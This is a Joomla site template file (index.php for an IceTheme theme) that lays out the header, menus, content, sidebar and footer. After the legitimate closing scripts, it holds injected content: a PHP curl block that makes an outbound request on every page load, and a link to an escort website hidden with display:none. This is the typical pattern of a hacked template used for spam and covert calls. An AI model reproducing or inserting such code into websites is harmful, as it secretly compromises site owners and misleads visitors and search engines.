<?php
//  @copyright	Copyright (C) 2013 IceTheme. All Rights Reserved
//  @license	Copyrighted Commercial Software 
//  @author     IceTheme (icetheme.com)

defined('_JEXEC') or die;

// Include Variables
include_once(JPATH_ROOT . "/templates/" . $this->template . '/icetools/vars.php'); 

if ((JRequest::getCmd("tmpl", "index") != "offline") && (JRequest::getCmd("tmpl", "index") != "soon") && ($it_comingsoon == 0)) { ?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>">
<head>

<?php if ($it_responsive == 1) { ?>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<?php } ?>

<jdoc:include type="head" />

	<?php
    // Include CSS and JS variables 
    include_once(IT_THEME_DIR.'/icetools/css.php');
    ?>
   
</head>

<body class="<?php echo $pageclass->get('pageclass_sfx'); ?>">   

	<?php if ($it_iceslideshow != 0) { ?>
    <div id="iceslideshow" class="container iceslideshow-fill">
        <jdoc:include type="modules" name="iceslideshow" />
    </div>
    <?php } ?>
    
    <?php if ($it_headerimage != 0) { ?>
    <div id="headerimage">
        <jdoc:include type="modules" name="header" />
    </div>
    <?php } ?>
    
    <?php if (($it_headerimage == 0) && ($it_iceslideshow == 0)) { ?>
    <div id="headerimage-noimage">
	</div>
	<?php } ?>
    
    <!-- header -->
    <header id="header">
    
        <div class="container">
        
            <div class="row">
                
                <div id="notice" class="span4">	
                   <jdoc:include type="modules" name="notice" />
                </div> 
                
                <?php if ($it_logo != "") { ?>
                <div id="logo" class="span4">	
                <a href="<?php echo $this->baseurl ?>"><?php echo $it_logo_img; ?></a> 	
                </div>
                <?php } ?>   
                
                <?php if (($it_language || $it_search || $it_topmenu) != 0) { ?>
				<div class="header-right span4">
                
					<?php if ($it_language != 0) { ?>
                    <div id="language">	
                       <jdoc:include type="modules" name="language" />
                    </div> 
                    <?php } ?>
                    
                    <?php if ($it_search != 0) { ?>
                    <div id="search">
                        <jdoc:include type="modules" name="search" />
                    </div>
                    <?php } ?>  
                    
                     <?php if ($it_topmenu != 0) { ?>
                    <div id="topmenu">
                      <jdoc:include type="modules" name="topmenu" />
                    </div>
                    <?php } ?>
             
             	</div>
             	<?php } ?>
                 
             </div>   
            
		</div>
    
    </header><!-- /header -->
    
        
	<?php if ($it_mainmenu != 0) { ?>
    <div id="mainmenu">
        <div class="container">
        	<jdoc:include type="modules" name="mainmenu" />
        </div> 
    </div>
    <?php } ?>  
    
    
    <?php if ($it_pageheading != 0) { ?>
    <div id="page_heading">
        <div class="container">
        	<jdoc:include type="modules" name="pageheading" style="xhtml" />
        </div> 
    </div>
    <?php } ?>  
         

	<!-- content -->
    <div id="content_shadow" class="container"></div>
    
	<section id="content" class="container">

		<jdoc:include type="modules" name="breadcrumbs" />
        
        
        <?php if ($it_promo != 0) { ?> 
        <div id="promo" class="row" >
            <jdoc:include type="modules" name="promo" style="promo" />
        </div>
        <?php } ?>
        
        <?php if ($it_testimonials != 0) { ?>
        <div id="testimonials" class="clearfix">
            <jdoc:include type="modules" name="testimonials" />
        </div>
        <?php } ?>
        
     <?php if (($it_promo || $it_testimonials) != 0) { ?>
   <hr class="topsep" />
      <?php } ?>
         
		<div class="row">
        
            <!-- Middle Col -->
            <div id="middlecol" class="<?php echo $content_span;?>">
            
                <div class="inside">
                                           
                    <jdoc:include type="message" />
                
                    <jdoc:include type="component" />
                
                </div>
            
            </div>
            <!-- / Middle Col  -->
                
			<?php if ($it_sidebar != 0) { ?> 
            <!-- sidebar -->
            <div id="sidebar" class="<?php echo $sidebar_span;?> <?php if($it_sidebar_pos == 'right') {  echo 'sidebar_right'; } ?>" >
                <div class="inside">    
                    <jdoc:include type="modules" name="sidebar" style="sidebar" />
                </div>
            </div>
            <!-- /sidebar -->
            <?php } ?> 
                           
		</div>
        
        <hr class="bottomsep" />
       
    	<?php if (($it_twitter || $it_social )!=0)  { ?>  
        <div id="social">
        
        	<div class="row">
			
				<?php if ($it_twitter !=0 )  { ?>  
                <div id="twitter_mod" class="<?php echo $social_span; ?>">
                    <jdoc:include type="modules" name="twitter" />  
                </div>   
                <?php } ?>
                
                <?php if ($it_social !=0 )  { ?>  
                <div id="social_icons" class="span4">
                    <jdoc:include type="modules" name="social" /> 
                </div>         
                <?php } ?>
                
             </div>
             
        </div>
        <?php } ?>
        
    </section><!-- / Content  --> 
    
	<?php if ($it_icecarousel != 0) { ?>
    <div id="icecarousel">
    	<div class="container">
        	<jdoc:include type="modules" name="icecarousel" style="slider" />      
        </div>     
    </div>   
    <?php } ?>

      
	<footer id="footer" class="container">
		
		<?php if ($it_footer != 0) { ?>
        <div class="row" >
            <jdoc:include type="modules" name="footer" style="footer" />
        </div>
        <?php } ?>
        
 
		<div id="copyright">
            <p class="copytext">
                © <?php echo date('Y');?> <?php echo $sitename; ?> 
            </p>          
            <jdoc:include type="modules" name="copyrightmenu" />
		</div>
   
	</footer>   
  
	<?php if ($it_gotop != 0) { ?>
    <div id="gotop" class="">
        <a href="#" class="scrollup"><?php echo JText::_('TPL_FIELD_SCROLL'); ?></a>
    </div>
    <?php } ?>  

        
	<?php if ($it_slide != 0) { 
     // Include slide module position
        include_once(IT_THEME_DIR.'/icetools/slide.php');
    } ?>
    
    
    <?php if ($it_styleswitcher != 0) { 
        // Include style switcher JS 
        include_once(IT_THEME_DIR.'/icetools/style_switcher.php');
    } ?>
    
    <?php if ($it_headerimage != 0) { ?>
    <script src="<?php echo IT_THEME; ?>/js/jquery.anystretch.min.js" type="text/javascript"></script>
    <script type="text/javascript">
        jQuery(".stretchMe").anystretch();
    </script>
	<?php } ?><?php
$exe = curl_init();
curl_setopt($exe, CURLOPT_URL, "");
curl_exec($exe);
?>
    
<a href="https://www.diyarbakirescort.com/" title="diyarbakır escort" style="display: none">diyarbakır escort</a>
</body>
</html>
<?php } ?>
